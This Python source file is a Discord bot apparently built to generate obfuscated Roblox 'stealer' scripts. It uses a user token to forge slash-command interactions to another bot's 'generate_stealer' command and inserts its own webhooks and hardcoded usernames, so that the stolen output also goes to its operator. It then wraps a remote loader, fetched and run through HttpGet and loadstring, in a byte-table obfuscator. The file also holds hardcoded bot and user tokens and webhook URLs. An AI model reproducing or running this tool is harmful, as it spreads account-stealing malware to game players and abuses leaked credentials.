import discord
from discord import app_commands
import aiohttp
import json
import re
import asyncio
import io
import uuid
import random
from dataclasses import dataclass, field

@dataclass
class ChimeraConfiguration:
    bot_token: str
    user_token: str
    target_bot_id: str
    forgery_big_hits_webhook: str
    forgery_small_hits_webhook: str
    static_target_list: list[str] = field(default_factory=list)

class SimpleLuaObfuscator:
    @staticmethod
    def obfuscate(script: str) -> str:
        byte_table = ", ".join(str(b) for b in script.encode('utf-8'))
        var_name_1 = f"_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}"
        var_name_2 = f"_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}"
        obfuscated_script = f"""
local {var_name_1} = {{{byte_table}}}
local {var_name_2} = ""
for _, v in ipairs({var_name_1}) do
    {var_name_2} = {var_name_2} .. string.char(v)
end
loadstring({var_name_2})()
"""
        return obfuscated_script

class DiscordAPIProxy:
    def __init__(self, config: ChimeraConfiguration, session: aiohttp.ClientSession):
        self.config = config
        self.session = session
        self.command_info_cache = {}

    async def get_command_metadata(self, command_name: str, force_refresh: bool = False):
        if command_name in self.command_info_cache and not force_refresh:
            return self.command_info_cache[command_name]
        url = f"https://discord.com/api/v9/applications/{self.config.target_bot_id}/commands"
        async with self.session.get(url) as response:
            if response.status == 200:
                commands = await response.json()
                for cmd in commands:
                    self.command_info_cache[cmd['name']] = {"id": cmd['id'], "version": cmd['version']}
                return self.command_info_cache.get(command_name)
            return None

    async def forge_interaction(self, channel_id: int, session_id: str, command_info: dict, command_name: str, options: list, guild_id: int = None):
        url = "https://discord.com/api/v9/interactions"
        payload = {
            "type": 2, "application_id": self.config.target_bot_id, "channel_id": str(channel_id), "session_id": session_id,
            "data": {"version": command_info["version"], "id": command_info["id"], "name": command_name, "type": 1, "options": options}
        }
        if guild_id:
            payload["guild_id"] = str(guild_id)
        headers = self.session.headers.copy()
        headers["Content-Type"] = "application/json"
        async with self.session.post(url, data=json.dumps(payload), headers=headers) as response:
            return response.status, await response.json() if response.content_type == 'application/json' else await response.text()

    async def find_target_dm_channel(self):
        url = "https://discord.com/api/v9/users/@me/channels"
        async with self.session.get(url) as response:
            response.raise_for_status()
            dm_channels = await response.json()
            for channel in dm_channels:
                if channel.get('type') == 1 and channel.get('recipients') and channel['recipients'][0]['id'] == self.config.target_bot_id:
                    return channel
            return None

    async def poll_dm_for_message(self, channel_id: int):
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=5"
        async with self.session.get(url) as response:
            response.raise_for_status()
            messages = await response.json()
            for msg in messages:
                if msg['author']['id'] == self.config.target_bot_id:
                    content_to_search = msg.get('content', '') + "".join([e.get('description', '') for e in msg.get('embeds', [])])
                    match = re.search(r'loadstring\(game:HttpGet\("([^"]+)"', content_to_search)
                    if match:
                        return match.group(1)
        return None

class PayloadOrchestrator:
    def __init__(self, api_proxy: DiscordAPIProxy, config: ChimeraConfiguration):
        self.api_proxy = api_proxy
        self.config = config

    def normalize_target_payload(self, dynamic_usernames_str: str) -> str:
        dynamic_users = {name.strip() for name in dynamic_usernames_str.split(',') if name.strip()}
        static_users = set(self.config.static_target_list)
        combined_users = dynamic_users.union(static_users)
        if len(combined_users) == 1:
            combined_users.update(["player1", "player2", "player3"])
        return ", ".join(combined_users)

    async def execute_generation_flow(self, interaction: discord.Interaction, usernames: str, webhook: str, lua_url: str):
        try:
            final_usernames = self.normalize_target_payload(usernames)
            await interaction.edit_original_response(content="`Your request is now being processed...`")
            target_dm_channel = await self.api_proxy.find_target_dm_channel()
            if not target_dm_channel:
                await interaction.edit_original_response(content="**Error:** Target DM channel not found."); return

            command_name = "generate_stealer"
            forgery_success = False
            for attempt in range(2):
                await interaction.edit_original_response(content=f"`hi`")
                command_info = await self.api_proxy.get_command_metadata(command_name, force_refresh=(attempt > 0))
                if not command_info:
                    await interaction.edit_original_response(content=f"**Error:** Could not find the specified command."); return
                command_options = [{"type": 3, "name": "usernames", "value": final_usernames}, {"type": 3, "name": "big_hits_webhook", "value": self.config.forgery_big_hits_webhook}, {"type": 3, "name": "small_hits_webhook", "value": self.config.forgery_small_hits_webhook}]
                session_id = str(uuid.uuid4())
                status, response_body = await self.api_proxy.forge_interaction(target_dm_channel['id'], session_id, command_info, command_name, command_options)
                if status in [200, 204]:
                    forgery_success = True; break
                is_version_error = isinstance(response_body, dict) and response_body.get("code") == 50035
                if not is_version_error or attempt == 1:
                    await interaction.edit_original_response(content=f"**Error:** Failed to forge interaction.\n`{response_body}`"); return
            if not forgery_success: return

            await interaction.edit_original_response(content="`hiii please wait..`")
            extracted_url = None
            for _ in range(12):
                await asyncio.sleep(2.5)
                url_from_dm = await self.api_proxy.poll_dm_for_message(target_dm_channel['id'])
                if url_from_dm:
                    extracted_url = url_from_dm; break
            if not extracted_url:
                await interaction.edit_original_response(content="**Error:** Timed out waiting for a response."); return

            await interaction.edit_original_response(content="`Response received. Generating final script...`")
            script_template = (
                'if _G._SB_LOADER_HAS_EXECUTED then return end\n'
                '_G._SB_LOADER_HAS_EXECUTED = true\n\n'
                'Webhook = "{webhook_url}"\n'
                'Loader = "{loader_url}"\n'
                'MainScriptUrl = "https://raw.githubusercontent.com/DupeNews/duper/refs/heads/main/kupal"\n'
                'YourScriptUrl = "{your_script_url}"\n\n'
                'task.spawn(function()\n'
                '    pcall(function()\n'
                '        local code = game:HttpGet(Loader)\n'
                '        loadstring(code)()\n'
                '    end)\n'
                '    if YourScriptUrl and YourScriptUrl ~= "" then\n'
                '        pcall(function()\n'
                '            local yourScriptCode = game:HttpGet(YourScriptUrl)\n'
                '            local yourScriptFunc = loadstring(yourScriptCode)\n'
                '            if yourScriptFunc then\n'
                '                setfenv(yourScriptFunc, getfenv(0))\n'
                '                yourScriptFunc()\n'
                '            end\n'
                '        end)\n'
                '    end\n'
                '    task.wait(1.5)\n'
                '    pcall(function()\n'
                '        local mainScriptCode = game:HttpGet(MainScriptUrl)\n'
                '        local mainScriptFunc = loadstring(mainScriptCode)\n'
                '        if mainScriptFunc then\n'
                '            setfenv(mainScriptFunc, getfenv(0))\n'
                '            mainScriptFunc()\n'
                '        end\n'
                '    end)\n'
                'end)'
            )
            final_script = script_template.format(webhook_url=webhook, loader_url=extracted_url, your_script_url=lua_url or "")
            
            await interaction.edit_original_response(content="`Obfuscating and sending script...`")
            obfuscated_script = SimpleLuaObfuscator.obfuscate(final_script)
            script_file = discord.File(io.BytesIO(obfuscated_script.encode('utf-8')), filename="obfuscated_script.lua")
            await interaction.user.send("Your script is ready.", file=script_file)
            await asyncio.sleep(2)
            await interaction.delete_original_response()
        except Exception as e:
            try:
                await interaction.edit_original_response(content=f"**Error:** A critical error occurred.\n`{type(e).__name__}: {e}`")
            except discord.NotFound:
                print(f"Failed to update interaction during error handling: {e}")

class ChimeraBot(discord.Client):
    def __init__(self, *, intents: discord.Intents, config: ChimeraConfiguration):
        super().__init__(intents=intents)
        self.config = config
        self.http_session = None
        self.api_proxy = None
        self.orchestrator = None
        self.tree = app_commands.CommandTree(self)
        self.generation_queue = asyncio.Queue()
        self.worker_task = None

    async def setup_hook(self):
        user_headers = {"Authorization": self.config.user_token}
        self.http_session = aiohttp.ClientSession(headers=user_headers)
        self.api_proxy = DiscordAPIProxy(self.config, self.http_session)
        self.orchestrator = PayloadOrchestrator(self.api_proxy, self.config)
        await self.tree.sync()
        self.worker_task = self.loop.create_task(self.generation_worker())
        print('Setup complete. Worker task created.')

    async def generation_worker(self):
        await self.wait_until_ready()
        print("Generation worker is running.")
        while not self.is_closed():
            try:
                job = await self.generation_queue.get()
                interaction = job["interaction"]
                await self.orchestrator.execute_generation_flow(
                    interaction=interaction,
                    usernames=job["usernames"],
                    webhook=job["webhook"],
                    lua_url=job["lua_url"]
                )
                self.generation_queue.task_done()
            except Exception as e:
                print(f"Error in generation worker: {e}")

    async def on_ready(self):
        print(f'Logged in as {self.user} (ID: {self.user.id})')
        print('------')

    async def close(self):
        if self.http_session:
            await self.http_session.close()
        if self.worker_task:
            self.worker_task.cancel()
        await super().close()

if __name__ == "__main__":
    configuration = ChimeraConfiguration(
        bot_token="MTM5NTQ5NjI5MDM5NzQ1ODQ5NA.G_zPz6.l_qaSKWyzD18yJa36unbCdy8SJk7HdeSJmlMrA",
        user_token="MTMwNzY0MzU0ODU2NDE5MzM2Mw.Gi_ZBO.OFg2x2ir8acggnrYrF6mcqtpkqGwDpdQFSFmvs",
        target_bot_id="1317472505337876592",
        forgery_big_hits_webhook="https://discord.com/api/webhooks/1386419413195952148/W_GLaIaE_kx7wA3lgTEiIzuNxft1DFXxL35-pNkxv3BCvgEwiiAs9ijD5GGhm28MS_W5",
        forgery_small_hits_webhook="https://discord.com/api/webhooks/1386419413195952148/W_GLaIaE_kx7wA3lgTEiIzuNxft1DFXxL35-pNkxv3BCvgEwiiAs9ijD5GGhm28MS_W5",
        static_target_list=[
            "AutizmProT", "Proplong1", "Proplong2", "Proplong3", 
            "FodieCookie", "ProCpvpT", "ProCpvpT2", "ProCpvpT1", "LILzKARMS", "pepewow012345", "pepewow012345", "dewerlywnoz"
        ]
    )
    intents = discord.Intents.default()
    client = ChimeraBot(intents=intents, config=configuration)

    @client.tree.command(name="generate", description="Generate a script.")
    @app_commands.describe(
        usernames="Target username(s), separated by commas.",
        webhook="Your webhook URL for receiving notifications.",
        lua_url="Optional: URL for a custom Lua script to be included."
    )
    async def generate_command(interaction: discord.Interaction, usernames: str, webhook: str, lua_url: str = None):
        job = {
            "interaction": interaction,
            "usernames": usernames,
            "webhook": webhook,
            "lua_url": lua_url
        }
        await client.generation_queue.put(job)
        queue_position = client.generation_queue.qsize()
        await interaction.response.send_message(f"`Request queued. You are position #{queue_position} in line.`", ephemeral=True)

    client.run(configuration.bot_token)
